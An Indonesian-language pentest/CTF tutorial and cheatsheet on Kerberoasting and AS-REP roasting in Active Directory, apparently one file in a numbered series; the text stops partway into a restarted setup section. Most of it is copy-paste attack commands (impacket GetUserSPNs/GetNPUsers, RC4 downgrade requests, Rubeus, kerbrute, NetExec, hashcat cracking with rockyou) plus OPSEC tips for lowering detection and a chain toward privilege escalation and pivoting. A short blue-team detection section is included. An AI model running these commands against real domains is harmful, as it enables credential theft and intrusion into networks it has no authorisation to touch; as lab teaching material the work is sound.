Kerberos dapat menggunakan beberapa encryption type. Dalam pembahasan roasting, dua keluarga penting adalah:

|Etype|Contoh|Karakteristik umum|
|---|---|---|
|**23**|RC4-HMAC|Sering muncul pada lab lama / konfigurasi legacy dan umumnya lebih menarik untuk cracking dibanding AES|
|**18**|AES256-CTS-HMAC-SHA1|Lebih modern dan secara umum lebih mahal untuk dicrack|

### 🧠 RC4 vs AES256

```
RC4 / etype 23
  └── sering lebih crackable

AES256 / etype 18
  └── lebih mahal secara komputasi
```

### 🎯 Hashcat Mode yang Perlu Diingat

```
Kerberoasting RC4 / etype 23 → 13100
AS-REP etype 23              → 18200
Kerberoasting AES256          → 19700
```

### 🔻 Force RC4 / Downgrade Request

Pada environment yang mendukung dan lab mengizinkannya, request dapat ditargetkan pada etype yang sesuai.

```
# REQUEST TGS ETYPE 23 JIKA SUPPORTED OLEH TOOL / TARGET
# Tujuannya mendapatkan RC4 material yang umumnya lebih cocok untuk workflow cracking tertentu.
impacket-GetUserSPNs -dc-ip $DC_IP \
  $DOMAIN/$USERNAME:$PASSWORD \
  -request \
  -etype 23 \
  -outputfile spn_rc4_hashes.txt
```

> **Catatan penting:** jangan menganggap downgrade selalu tersedia. Dukungan etype bergantung pada tool, account configuration, domain policy, dan implementasi KDC.

---

## 6.2 🎯 Targeted Kerberoasting

Targeted Kerberoasting berarti memprioritaskan account tertentu daripada meminta ticket terhadap semua kandidat.

### Dasar penentuan target:

```
SPN ada
   │
   ├── PasswordLastSet sangat lama
   ├── Privilege tinggi
   ├── service account penting
   └── account dengan konteks menarik
```

Contoh filtering dasar dari output yang telah dikumpulkan:

```
# FILTER BARIS YANG MEMILIKI TANGGAL
# Digunakan hanya sebagai contoh parsing kasar; validasi manual tetap diperlukan.
impacket-GetUserSPNs -dc-ip $DC_IP \
  $DOMAIN/$USERNAME:$PASSWORD |
  grep -E "20[0-9]{2}-[0-9]{2}" |
  awk '$NF < "2023-01-01" {print $1}'
```

> Parsing tabel CLI dengan `grep`/`awk` bersifat rapuh jika format output berubah. Untuk automation yang serius, lebih baik konsumsi format yang stabil atau gunakan LDAP query terstruktur.

---

## 6.3 🪶 Kerberoasting via LDAP — Saat `-request` Tidak Bisa Digunakan

Ada kondisi ketika enumeration SPN tetap bisa dilakukan tetapi request ticket langsung gagal, misalnya:

- masalah DNS;
    
- clock skew;
    
- authentication/session issue;
    
- versi tool berbeda;
    
- domain policy/etype mismatch;
    
- target tidak merespons pada jalur yang diharapkan.
    

Dalam kondisi tersebut, pisahkan dua fase:

```
Fase A: LDAP enumeration
    ↓
Dapatkan account + SPN
    ↓
Fase B: Kerberos request
    ↓
Request TGS dengan tool/host/path alternatif

> [!NOTE]\n> **Contoh pesan error LDAP fallback**:\n> - `CCache initialization failed`\n> - `Kerberos SessionError: KRB_ERR_GENERIC`\n> Jika Anda mengalami kegagalan request, lakukan enumerasi LDAP terlebih dahulu, kemudian gunakan tool alternatif atau perbaiki waktu/clock skew.
```

Contoh LDAP enumeration manual:

```
# ENUM SPN TANPA MEMINTA TGS DALAM SATU LANGKAH
ldapsearch -x -H ldap://$DC_IP \
  -D "$USERNAME@$DOMAIN" \
  -w "$PASSWORD" \
  -b "DC=corp,DC=local" \
  "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName
```

Tujuannya bukan “menghasilkan hash otomatis”, tetapi memastikan discovery SPN tetap dapat dilakukan walaupun workflow request perlu dipisahkan.

---

## 6.4 🌳 Roasting dalam Trust Environment

Pada environment dengan forest/domain trust, perspektif attacker berubah karena principal, ticket, dan service dapat berada di domain/forest berbeda.

Hal yang perlu ditanyakan:

```
Apakah ada trust?
       │
       ├──► Domain mana yang trusted?
       ├──► One-way atau two-way?
       ├──► Ada account/service menarik di domain lain?
       └──► Apakah credential yang didapat berlaku lintas trust?
```

Dalam advanced CTF, roasting dapat menjadi bagian dari chain:

```
Compromise Domain A
      ↓
Obtain credentials
      ↓
Discover trust
      ↓
Enumerate Domain B
      ↓
Identify SPN / pre-auth weakness
      ↓
Roast
      ↓
Crack
      ↓
Pivot / privilege escalation
```

Jangan menganggap trust otomatis berarti akses penuh. Trust dan authorization adalah konsep berbeda.

---

# 🕵️ BAGIAN 7 — DETECTION & EVASION (UNTUK PEMAHAMAN BLUE TEAM)

## 7.1 🚨 Bagaimana Blue Team Mendeteksi Kerberoasting?

Salah satu event penting adalah:

```
Event ID 4769
A Kerberos service ticket was requested
```

Indikator yang dapat dianalisis:

- lonjakan request TGS dalam waktu singkat;
    
- pola request abnormal terhadap banyak SPN;
    
- request etype tertentu, terutama pola RC4 yang tidak lazim;
    
- sumber request yang tidak biasa;
    
- account biasa yang tiba-tiba meminta ticket untuk banyak service account.
    

### 🛡️ Cara Berpikir Defender

```
Normal workstation
 └── request beberapa service ticket

Suspicious workstation
 └── request banyak SPN dalam waktu singkat
      ├── svc_sql
      ├── svc_web
      ├── svc_backup
      ├── svc_app
      └── ...
```

Yang dicari defender bukan sekadar “ada Event 4769”, tetapi **pola** di balik event tersebut.

---

## 7.2 🤫 OPSEC Tips untuk Kerberoasting

Untuk lab/CTF, volume besar biasanya tidak masalah. Untuk real engagement, noise tetap perlu dipertimbangkan.

### 🎯 Targeted request

```
# REQUEST SATU TARGET SAJA
# Berguna jika tujuan assessment hanya memvalidasi service account tertentu.
impacket-GetUserSPNs -dc-ip $DC_IP \
  $DOMAIN/$USERNAME:$PASSWORD \
  -request-user svc_sql
```

### ⏱️ Delay

```
Request 1
   ↓
[delay]
   ↓
Request 2
   ↓
[delay]
   ↓
Request 3
```

Delay relevan untuk engagement nyata, tetapi tidak perlu dibuat rumit untuk CTF.

### ⚖️ Trade-off RC4 vs AES

```
RC4
 ├── lebih menarik untuk cracking
 └── pola request dapat lebih mudah dicurigai

AES
 ├── lebih mahal untuk cracking
 └── bisa sesuai dengan environment modern
```

> **OPSEC bukan berarti “menjadi tidak terdeteksi”.** Tujuannya adalah memahami trade-off antara noise, coverage, dan tujuan pengujian.

---

# 🌳 BAGIAN 8 — MASTER DECISION TREE

```
[MASUK KE ENVIRONMENT AD]
         │
         ▼
[Ketahui DOMAIN / DC / USER LIST]
         │
         ├───────────────────────────────────────┐
         │                                       │
         ▼                                       ▼
[ PUNYA DOMAIN CREDENTIALS? ]              [ TIDAK ]
         │                                       │
      ┌──┴──┐                                    ▼
     YA     TIDAK                         [AS-REP ROASTING]
      │       │                                 │
      │       └──────────────────────┐          ▼
      │                              │    [Butuh username list]
      │                              │          │
      ▼                              ▼          ▼
[Kerberoast]                    [Kerbrute] → valid_users.txt
      │                              │          │
      │                              └──────────┘
      ▼                                         │
[SPN enumeration]                               ▼
      │                                  [GetNPUsers]
      ▼                                         │
[GetUserSPNs -request]                          ▼
      │                                  $krb5asrep$...
      ▼                                         │
$krb5tgs$23$...                                 ▼
      │                                    [Hashcat 18200]
      ▼                                         │
[Hashcat 13100]                         ┌───────┴────────┐
      │                                YA                 TIDAK
 ┌────┴─────┐                            │                  │
YA          TIDAK                         ▼                  ▼
 │            │                    [Credential]      [Lanjutkan enum]
 ▼            ▼                         │
[Password] [Rules/Wordlist]             │
 │            │                         │
 │            └──────► [Crack ulang]    │
 │                                      │
 └──────────────────────────────────────┘
                    │
                    ▼
           [VALIDASI CREDENTIAL]
                    │
        ┌───────────┼────────────┐
        │           │            │
        ▼           ▼            ▼
       SMB         WinRM        MSSQL
        │           │            │
        └───────────┼────────────┘
                    ▼
            [BloodHound / ACL]
                    │
                    ▼
             [Attack Path]
```

### 🧠 Urutan Muscle Memory

```
1. ADA USERNAME?
      ↓
2. ADA USER TANPA PREAUTH?
      ↓
3. ADA SPN?
      ↓
4. REQUEST HASH
      ↓
5. IDENTIFIKASI FORMAT
      ↓
6. PILIH MODE HASHCAT
      ↓
7. CRACK OFFLINE
      ↓
8. VALIDASI PASSWORD
      ↓
9. CARI AKSES
      ↓
10. BLOODHOUND / ACL
      ↓
11. PIVOT KE ATTACK PATH BERIKUTNYA
```

---

# ⚡ BAGIAN 9 — QUICK REFERENCE CHEATSHEET

## 🧪 Kerberoasting Cheatsheet

```
# ============================================
# KERBEROASTING CHEATSHEET
# ============================================

# SETUP VARIABEL
export DOMAIN="corp.local"
export DC_IP="10.10.10.100"
export USERNAME="john.smith"
export PASSWORD="Password123"

# ENUM SPN
impacket-GetUserSPNs -dc-ip $DC_IP $DOMAIN/$USERNAME:$PASSWORD

# REQUEST HASH
impacket-GetUserSPNs -dc-ip $DC_IP $DOMAIN/$USERNAME:$PASSWORD \
  -request -outputfile spn_hashes.txt

# TARGETED REQUEST
impacket-GetUserSPNs -dc-ip $DC_IP $DOMAIN/$USERNAME:$PASSWORD \
  -request-user svc_sql -outputfile svc_sql_hash.txt

# CRACK RC4 / ETYPE 23
hashcat -m 13100 spn_hashes.txt /usr/share/wordlists/rockyou.txt -w 3

# CRACK AES256 KERBEROAST MATERIAL
hashcat -m 19700 spn_hashes.txt /usr/share/wordlists/rockyou.txt -w 3

# SHOW CRACKED
hashcat -m 13100 spn_hashes.txt --show
```

## 🧪 AS-REP Roasting Cheatsheet

```
# ============================================
# AS-REP ROASTING CHEATSHEET
# ============================================

# ENUM TANPA CREDS — BUTUH USERLIST
impacket-GetNPUsers $DOMAIN/ -dc-ip $DC_IP \
  -usersfile users.txt -no-pass -outputfile asrep_hashes.txt

# DENGAN CREDENTIALS
impacket-GetNPUsers -dc-ip $DC_IP $DOMAIN/$USERNAME:$PASSWORD \
  -request -outputfile asrep_hashes.txt

# CRACK AS-REP ETYPE 23
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -w 3

# SHOW CRACKED
hashcat -m 18200 asrep_hashes.txt --show
```

## 👤 Username Enumeration Cheatsheet

```
# ============================================
# USERNAME ENUMERATION CHEATSHEET
# ============================================

# KERBRUTE
kerbrute userenum --dc $DC_IP -d $DOMAIN \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -o valid_users.txt

# NETEXEC — KERBEROAST
nxc ldap $DC_IP -u $USERNAME -p $PASSWORD \
  --kerberoasting spn_hashes.txt

# NETEXEC — AS-REP ROAST
nxc ldap $DC_IP -u $USERNAME -p $PASSWORD \
  --asreproast asrep_hashes.txt
```

## 🪟 Rubeus Cheatsheet

```
:: ============================================
:: RUBEUS CHEATSHEET
:: ============================================

:: KERBEROAST
Rubeus.exe kerberoast /format:hashcat /nowrap /outfile:kerb_hashes.txt

:: AS-REP ROAST
Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep_hashes.txt

:: TARGETED KERBEROAST
Rubeus.exe kerberoast /user:svc_sql /format:hashcat /nowrap

:: TARGETED AS-REP ROAST
Rubeus.exe asreproast /user:svc_backup /format:hashcat /nowrap
```

---

# 🧯 BAGIAN 10 — COMMON ERRORS & TROUBLESHOOTING

## 10.1 ⏰ `Kerberos SessionError: KRB_AP_ERR_SKEW`

```
ERROR: Kerberos SessionError: KRB_AP_ERR_SKEW
PENYEBAB: Jam client berbeda cukup jauh dari Domain Controller.
SOLUSI: Sinkronkan waktu client dengan waktu DC.
```

```
# CEK WAKTU SISTEM
 date
 timedatectl status

# OPSI LEGACY: SYNC DENGAN NTP DC
sudo ntpdate $DC_IP

# ATAU GUNAKAN timedatectl SESUAI KONDISI ENVIRONMENT
sudo timedatectl set-ntp true
```

> Dalam environment modern, `ntpdate` dapat tidak terpasang atau tidak menjadi metode utama. Fokus pada sinkronisasi clock dengan sumber waktu yang tepat.

## 10.2 🔑 `KDC_ERR_PREAUTH_FAILED`

```
ERROR: Kerberos SessionError: KDC_ERR_PREAUTH_FAILED
PENYEBAB: Credential yang digunakan salah, terutama password.
SOLUSI: Verifikasi DOMAIN, USERNAME, PASSWORD, dan target DC.
```

```
# CEK FORMAT ACCOUNT
# Pastikan menggunakan domain yang benar.
printf '%s\n' "$DOMAIN/$USERNAME"

# CEK DOMAINCONTROLLER RESOLUTION
getent hosts "$DOMAIN"

# GUNAKAN CREDENTIAL YANG SUDAH DIVALIDASI
nxc smb $DC_IP -u $USERNAME -p "$PASSWORD"
```

## 10.3 🔎 `GetUserSPNs` Tidak Mengembalikan Hasil

```
ERROR: GetUserSPNs berjalan tetapi tidak return SPN.
PENYEBAB:
- Memang tidak ada user dengan SPN yang visible.
- Search base/domain salah.
- Credential tidak memiliki akses yang dibutuhkan.
- Target DC yang dipilih bukan DC yang tepat.
SOLUSI: Validasi domain, LDAP connectivity, dan ulangi enumeration.
```

```
# VALIDASI LDAP CONNECTIVITY
ldapsearch -x -H ldap://$DC_IP \
  -b "DC=corp,DC=local" \
  "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName
```

## 10.4 🧱 Hash Tidak Bisa Di-crack Setelah 1 Jam

```
ERROR: Hash belum cracked.
PENYEBAB:
- Password memang kuat.
- Candidate wordlist terlalu kecil / tidak relevan.
- Rule tidak cocok.
- Etype/mode salah.
- Hash tidak lengkap.
SOLUSI: Verifikasi format dan mode, lalu naikkan strategi cracking.
```

```
# VERIFIKASI FORMAT FILE
head -1 hash.txt

# COBA ROCKYOU + BEST64
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# CEK STATUS HASHCAT
hashcat -m 13100 hash.txt --status
```

## 10.5 📭 `[-] No entries found!` pada `GetNPUsers`

```
ERROR: [-] No entries found!
PENYEBAB:
- Tidak ada user dengan DONT_REQUIRE_PREAUTH yang cocok.
- Username list salah.
- Format domain/username salah.
SOLUSI: Validasi username list, domain, DC, dan ulangi enumeration.
```

```
# LIHAT ISI USERLIST
head users.txt

# PASTIKAN FORMAT USERNAME SATU PER BARIS
awk 'NF != 1 {print NR ":" $0}' users.txt

# ULANGI QUERY DENGAN TARGET YANG SUDAH DIKETAHUI
impacket-GetNPUsers $DOMAIN/ \
  -dc-ip $DC_IP \
  -usersfile users.txt \
  -no-pass \
  -format hashcat
```

## 10.6 🌐 Kerbrute `NETWORK ERROR` / Connection Refused

```
ERROR: NETWORK ERROR / connection refused
PENYEBAB:
- Port Kerberos 88 tidak reachable.
- IP bukan Domain Controller.
- Firewall/filtering.
- DNS/routing bermasalah.
SOLUSI: Validasi DC dan connectivity.
```

```
# CEK PORT KERBEROS
nmap -Pn -p 88 $DC_IP

# CEK RESOLUSI DOMAIN
getent hosts $DOMAIN

# CEK ROUTE KE DC
ip route get $DC_IP
```

## 10.7 🚫 Rubeus `Access Denied`

```
ERROR: Access denied / operasi Rubeus gagal.
PENYEBAB: Context Windows, token, privilege, atau credential yang dipakai tidak sesuai dengan operasi.
SOLUSI: Pastikan dijalankan dalam context domain yang benar dan pahami requirement command.
```

```
:: CEK IDENTITY SAAT INI
whoami

:: CEK GROUP MEMBERSHIP
whoami /groups

:: CEK DOMAIN
whoami /fqdn
```

## 10.8 🧩 Hash Format Tidak Dikenali Hashcat

```
ERROR: Hash format tidak dikenali.
PENYEBAB:
- Hash terpotong.
- Prefix salah.
- Ada line break / karakter tambahan.
- Mode hashcat salah.
SOLUSI: Ambil ulang hash dan validasi file.
```

```
# LIHAT KARAKTER / LINE ENDING
cat -A hash.txt

# BUAT SALINAN BERSIH DENGAN MEMBUANG CRLF
tr -d '\r' < hash.txt > hash_clean.txt

# CEK PANJANG BARIS
awk '{print length, $0}' hash_clean.txt | head
```

> Jangan menggabungkan beberapa hash ke satu baris secara sembarang. Setiap hash harus tetap mempertahankan format yang dihasilkan tool.

## 10.9 📏 Hashcat `Token length exception`

```
ERROR: Token length exception
PENYEBAB:
- Hash terpotong.
- Ada karakter ekstra.
- Hash menggunakan format berbeda dari mode yang dipilih.
SOLUSI: Re-request hash lalu validasi prefix dan struktur.
```

```
# CEK PREFIX
head -1 hash.txt

# BUANG CRLF JIKA FILE BERASAL DARI WINDOWS
tr -d '\r' < hash.txt > hash_clean.txt

# UJI DENGAN MODE YANG BENAR
hashcat -m 13100 hash_clean.txt --show
```

## 10.10 🧰 `impacket-GetUserSPNs: error: argument -request`

```
ERROR: argument -request / opsi tidak dikenali atau syntax berbeda.
PENYEBAB: Versi paket Impacket berbeda dari dokumentasi yang sedang diikuti.
SOLUSI: Periksa help dari versi yang terpasang dan sesuaikan syntax.
```

```
# LIHAT VERSION
impacket-GetUserSPNs -h

# CEK PAKET YANG TERINSTAL
python3 -m pip show impacket

# LIHAT OPTIONS YANG SUPPORTED
impacket-GetUserSPNs --help
```

> Jangan memaksakan command dari tutorial yang dibuat untuk versi lain. Jadikan `--help` sebagai sumber syntax lokal yang authoritative.

## 10.11 ⏱️ Clock Skew > 5 Menit

```
ERROR: Clock skew lebih dari batas yang diterima Kerberos.
PENYEBAB: Waktu client dan DC berbeda terlalu jauh.
SOLUSI: Matikan sinkronisasi yang konflik lalu sync ke sumber waktu target bila environment lab mengizinkan.
```

```
# CEK STATUS NTP
 timedatectl status

# MATIKAN NTP SEMENTARA JIKA PERLU DI LAB
sudo timedatectl set-ntp false

# SYNC KE DC DENGAN TOOL YANG TERSEDIA
sudo ntpdate -s $DC_IP

# CEK HASILNYA
 date
 timedatectl status
```

## 10.12 🔐 Hash Berhasil Di-crack tetapi Login Gagal

```
ERROR: Password berhasil di-crack tetapi authentication gagal.
PENYEBAB:
- Password sudah diganti setelah ticket/hash diperoleh.
- Account disabled/expired.
- Service menggunakan context yang berbeda.
- Host/service yang diuji bukan target yang benar.
- Network policy / logon restriction.
SOLUSI: Validasi kembali account state, target service, dan credential.
```

```
# VALIDASI PASSWORD TERKINI TERHADAP SMB
nxc smb $DC_IP -u svc_sql -p 'Summer2023!'

# VALIDASI TERHADAP TARGET SERVICE
nxc smb $TARGET -u svc_sql -p 'Summer2023!'

# CEK STATUS ACCOUNT JIKA MEMILIKI LDAP ACCESS
ldapsearch -x -H ldap://$DC_IP \
  -D "$USERNAME@$DOMAIN" \
  -w "$PASSWORD" \
  -b "DC=corp,DC=local" \
  "(sAMAccountName=svc_sql)" \
  userAccountControl pwdLastSet accountExpires
```

---

# 🧠 BAGIAN 11 — ANALISIS HASIL: JANGAN BERHENTI DI PASSWORD

Mendapatkan password bukanlah akhir workflow.

## 11.1 📌 Credential ≠ Privilege

```
Password valid
     │
     ▼
Authentication berhasil?
     │
  ┌──┴──┐
 YA    TIDAK
  │       │
  ▼       ▼
Akses   troubleshooting
  │
  ▼
Privilege apa?
  │
  ├── Local user
  ├── Service access
  ├── Remote management
  ├── Local admin
  ├── Domain group membership
  └── ACL/control path
```

## 11.2 🕸️ Kembali ke BloodHound

Setelah password baru didapat, ulangi pertanyaan:

```
Apakah account ini punya direct privilege?
Apakah account ini anggota group menarik?
Apakah account ini AdminTo host tertentu?
Apakah account ini dapat mengontrol object AD?
Apakah ada jalur ke Domain Admin?
```

Kerberoasting / AS-REP Roasting hanyalah **credential acquisition primitive**.

---

# 🧪 BAGIAN 12 — PRAKTIK MUSCLE MEMORY

Gunakan urutan berikut saat mengerjakan CTF/lab baru.

## 🟢 Scenario A — Sudah Punya Domain User

```
1. Identifikasi DOMAIN + DC
2. Enum user
3. Enum SPN
4. Jalankan Kerberoasting
5. Simpan hash
6. Identifikasi etype
7. Crack
8. Validasi password
9. Cek SMB / WinRM / MSSQL
10. Cek BloodHound
```

## 🟡 Scenario B — Belum Punya Credential

```
1. Identifikasi DC
2. Pastikan port 88 reachable
3. Username enumeration
4. AS-REP Roasting
5. Crack hash
6. Jika berhasil → credential
7. Validasi credential
8. Lanjut ke Kerberoasting
9. Cari privilege path
```

## 🔴 Scenario C — Semua Roasting Gagal

```
[Roasting gagal]
      │
      ├── Tidak ada SPN?
      │      └──► Jangan paksa Kerberoasting
      │
      ├── Tidak ada user tanpa pre-auth?
      │      └──► Jangan paksa AS-REP Roasting
      │
      ├── Hash ada tapi gagal crack?
      │      └──► Ubah candidate strategy
      │
      └── Tidak bisa request ticket?
             └──► Troubleshoot DNS / waktu / credential / etype
```

---

# ✅ BAGIAN 13 — FINAL CHECKLIST

## Kerberos Fundamentals

```
[ ] Saya memahami AS, TGS, TGT.
[ ] Saya tahu TGT berbeda dari TGS.
[ ] Saya tahu SPN digunakan untuk apa.
[ ] Saya tahu kenapa SPN relevan ke Kerberoasting.
[ ] Saya tahu apa itu UF_DONT_REQUIRE_PREAUTH.
[ ] Saya tahu perbedaan krb5tgs dan krb5asrep.
```

## Kerberoasting

```
[ ] Bisa enum SPN dengan GetUserSPNs.
[ ] Bisa request TGS.
[ ] Bisa menyimpan hash ke file.
[ ] Bisa mengenali $krb5tgs$.
[ ] Tahu hashcat mode 13100.
[ ] Tahu mode AES256 Kerberoasting 19700.
[ ] Bisa menggunakan Hashcat.
[ ] Bisa menggunakan John sebagai alternatif.
[ ] Bisa targeted Kerberoasting.
[ ] Bisa menganalisis account setelah password ditemukan.
```

## AS-REP Roasting

```
[ ] Paham pre-authentication.
[ ] Bisa enum user vulnerable.
[ ] Bisa GetNPUsers tanpa credential.
[ ] Bisa GetNPUsers dengan credential.
[ ] Bisa Rubeus asreproast.
[ ] Bisa mengenali $krb5asrep$.
[ ] Tahu hashcat mode 18200.
[ ] Bisa crack dan validasi password.
```

## Username Enumeration

```
[ ] Bisa menggunakan Kerbrute.
[ ] Bisa membuat valid_users.txt.
[ ] Bisa mengambil username via LDAP.
[ ] Bisa mengambil username via enum4linux-ng.
```

## Troubleshooting

```
[ ] Paham clock skew.
[ ] Paham KDC_ERR_PREAUTH_FAILED.
[ ] Bisa menangani no entries found.
[ ] Bisa membedakan wrong mode vs broken hash.
[ ] Bisa memeriksa versi Impacket.
[ ] Bisa memvalidasi credential setelah cracking.
```

---

# 📊 BAGIAN 14 — QUICK REFERENCE TABEL

|Kondisi|Pertanyaan|Tool utama|Output|
|---|---|---|---|
|Punya credential|Ada SPN?|`GetUserSPNs` / LDAP|SPN list|
|Punya SPN|Bisa request TGS?|`GetUserSPNs -request` / Rubeus|`krb5tgs`|
|Punya `krb5tgs`|Mode apa?|Hashcat|**13100 / 19700** tergantung etype|
|Tidak punya credential|Ada username valid?|Kerbrute|`valid_users.txt`|
|Ada username|Ada user tanpa pre-auth?|`GetNPUsers`|`krb5asrep`|
|Punya `krb5asrep`|Mode apa?|Hashcat|**18200**|
|Password ditemukan|Bisa dipakai di mana?|NetExec / Evil-WinRM / MSSQL|Access validation|
|Credential valid|Ada privilege path?|BloodHound|Attack path|

---

# 🚦 BAGIAN 15 — COMMAND MAP

```
                 KERBEROS ATTACK MAP

USERNAME LIST
      │
      ▼
   kerbrute
      │
      ▼
valid_users.txt
      │
      ▼
GetNPUsers ───────────────► $krb5asrep$ ─────► hashcat 18200
      │
      │
      └── credential didapat
                    │
                    ▼
              GetUserSPNs
                    │
                    ▼
               SPN targets
                    │
                    ▼
              TGS request
                    │
                    ▼
               $krb5tgs$
                    │
                    ▼
       ┌────────────┴────────────┐
       │                         │
       ▼                         ▼
hashcat 13100              hashcat 19700
  (RC4)                     (AES256)
       │                         │
       └────────────┬────────────┘
                    ▼
              VALID CREDENTIAL
                    │
                    ▼
        SMB / WinRM / MSSQL
                    │
                    ▼
             BloodHound / ACL
                    │
                    ▼
              NEXT ATTACK PATH
```

---

# 🧭 BAGIAN 16 — METODOLOGI PRAKTIS: APA YANG HARUS DITANYAKAN?

Alih-alih menghafal command secara terpisah, biasakan bertanya:

### Pertanyaan 1

> **Apakah saya punya credential?**

```
YA  → Kerberoasting + AS-REP Roasting
TIDAK → Username enum + AS-REP Roasting
```

### Pertanyaan 2

> **Ada SPN?**

```
YA  → kandidat Kerberoasting
TIDAK → Kerberoasting bukan jalur utama
```

### Pertanyaan 3

> **Ada user tanpa pre-auth?**

```
YA  → kandidat AS-REP Roasting
TIDAK → lanjut ke attack surface lain
```

### Pertanyaan 4

> **Hash sudah didapat, formatnya apa?**

```
krb5tgs$23 → Hashcat 13100
krb5tgs AES256 → Hashcat 19700
krb5asrep$23 → Hashcat 18200
```

### Pertanyaan 5

> **Password ditemukan, sekarang apa?**

```
VALIDATE → ENUMERATE ACCESS → BLOODHOUND → ACL / PRIVESC → PIVOT
```

### Pertanyaan 6

> **Password tidak ditemukan?**

Jangan langsung menyimpulkan teknik gagal.

Bedakan:

```
Technique failed
      vs
Cracking strategy failed
      vs
Target memang memakai password kuat
      vs
Hash/format/mode salah
```

---

# 🧠 BAGIAN 17 — HAL YANG SERING SALAH DIPAHAMI PEMULA

## ❌ “Ada SPN berarti pasti bisa dapat password.”

Salah.

SPN hanya menunjukkan kandidat service principal. Yang belum diketahui adalah apakah password account tersebut dapat di-_guess_ secara praktis.

## ❌ “AS-REP Roasting selalu tidak butuh credential.”

Tidak sesederhana itu.

Skenario tertentu memang memungkinkan request berbasis username tanpa password, tetapi Anda tetap membutuhkan username target dan kondisi account yang sesuai.

## ❌ “PasswordLastSet lama berarti password pasti lemah.”

Tidak. Itu hanya sinyal prioritas.

## ❌ “Password berhasil di-crack berarti selesai.”

Tidak. Anda masih harus menentukan apakah credential valid, di service mana berlaku, dan privilege apa yang dimiliki.

## ❌ “Kerberoasting dan AS-REP Roasting sama.”

Mereka berbeda pada objek dan tahap Kerberos yang disalahgunakan:

```
Kerberoasting
SPN → TGS → krb5tgs

AS-REP Roasting
No Pre-Auth → AS-REP → krb5asrep
```

---

# 🏁 BAGIAN 18 — MASTER SUMMARY

```
KERBEROASTING
============= 
Input:
  Domain credential

Cari:
  User dengan SPN

Request:
  TGS / Service Ticket

Output:
  $krb5tgs$...

Cracking:
  13100 (etype 23)
  19700 (AES256)

Goal:
  Mendapatkan password service account
```

```
AS-REP ROASTING
===============
Input:
  Username list atau domain credential

Cari:
  User dengan UF_DONT_REQUIRE_PREAUTH

Request:
  AS-REP tanpa pre-authentication

Output:
  $krb5asrep$...

Cracking:
  18200 (etype 23)

Goal:
  Mendapatkan password user target
```

```
SETELAH PASSWORD DIDAPAT
========================
1. Validate credential
2. Test relevant services
3. Enumerate access
4. Check BloodHound
5. Analyze ACL / group membership
6. Find privilege path
7. Continue attack chain
```

---

# ➡️ Lanjut ke File Berikutnya

## 🔗 [🔐 File 38 — Active Directory ACL Abuse Workflow](/docs/ad-acl-abuse)

Setelah mendapatkan credentials dari **Kerberoasting** atau **AS-REP Roasting**, langkah selanjutnya adalah melihat **apa yang bisa dilakukan dengan credentials tersebut melalui ACL abuse**.

```
37 — Kerberoasting / AS-REP Roasting
                │
                ▼
        Dapatkan credentials
                │
                ▼
38 — AD ACL Abuse Workflow
                │
                ├── GenericAll
                ├── GenericWrite
                ├── WriteDACL
                ├── WriteOwner
                ├── ForceChangePassword
                ├── AddMember
                └── Control / privilege path
```

> **Mental model:** roasting memberi Anda **credential material**. ACL abuse membantu menjawab pertanyaan berikutnya: **“Dengan identity ini, object Active Directory apa yang sebenarnya dapat saya kontrol?”**

---

# 📋 Audit Checklist File 37

```
AUDIT CHECKLIST FILE 37:

Kerberos Fundamentals
[ ] Diagram ASCII TGT/TGS flow ada?
[ ] Perbedaan TGT vs TGS untuk attacker jelas?
[ ] Tabel perbandingan Kerberoasting vs AS-REP ada?

Kerberoasting
[ ] Impacket GetUserSPNs (enum + request) ada?
[ ] PowerView commands ada?
[ ] Rubeus commands ada?
[ ] NetExec commands ada?
[ ] Hashcat mode 13100 ada?
[ ] John alternative ada?
[ ] Decision tree setelah dapat password ada?

AS-REP Roasting
[ ] GetNPUsers tanpa creds ada?
[ ] GetNPUsers dengan creds ada?
[ ] Rubeus asreproast ada?
[ ] Hashcat mode 18200 ada?
[ ] Contoh output krb5asrep ada?

Username Enumeration
[ ] Kerbrute commands ada?
[ ] LDAP alternative ada?
[ ] enum4linux-ng alternative ada?

Advanced
[ ] RC4 vs AES dijelaskan?
[ ] Mode 19700 disebut?
[ ] Targeted Kerberoasting ada?
[ ] LDAP fallback dijelaskan?
[ ] Trust environment dijelaskan?

Detection / OPSEC
[ ] Event ID 4769 dijelaskan?
[ ] TGS volume anomaly dijelaskan?
[ ] RC4 request dijelaskan?
[ ] Targeted request / trade-off dijelaskan?

Troubleshooting
[ ] Clock skew fix ada?
[ ] Minimal 10 error tercakup?
[ ] Password cracked tetapi login gagal tercakup?
[ ] Version mismatch tercakup?

Format
[ ] Cheatsheet copy-paste ready?
[ ] Link ke file 38 ada?
[ ] Command diberikan dalam code block?
[ ] Diagram ASCII untuk flow / decision tree ada?
[ ] Emoji di section header ada?
[ ] Bahasa Indonesia, command tetap Inggris?
[ ] Contoh output realistis ada?
[ ] Alasan setiap langkah dijelaskan?
```

# 🔥 Workflow 37 — Kerberoasting & AS-REP Roasting

## Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.
> 
> **Konteks:** Dokumen ini diasumsikan kamu sudah masuk ke environment Active Directory — entah dari SMB enumeration, dari exploit sebelumnya, atau dari credentials yang ditemukan di share. Jika belum, kembali ke [05. SMB & Samba Exploitation Workflow — Master Field Guide](/docs/smb-samba) dulu.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun. Satu kali di awal sesi.
export DC_IP="10.10.10.100"           # IP Domain Controller (port 88, 389, 445)
export DOMAIN="corp.local"             # Domain name (dari nxc smb output)
export USERNAME="john.smith"           # Domain user yang sudah kamu punya
export PASSWORD="Password123!"         # Password user tersebut
export LHOST="10.10.14.5"             # IP tun0 kamu

# Buat folder kerja
mkdir -p ~/ad_loot/{hashes,creds,users,bloodhound}
cd ~/ad_loot

echo "[*] DC: $DC_IP | Domain: $DOMAIN | User: $USERNAME"

# Tambahkan DC ke /etc/hosts agar resolusi nama bekerja
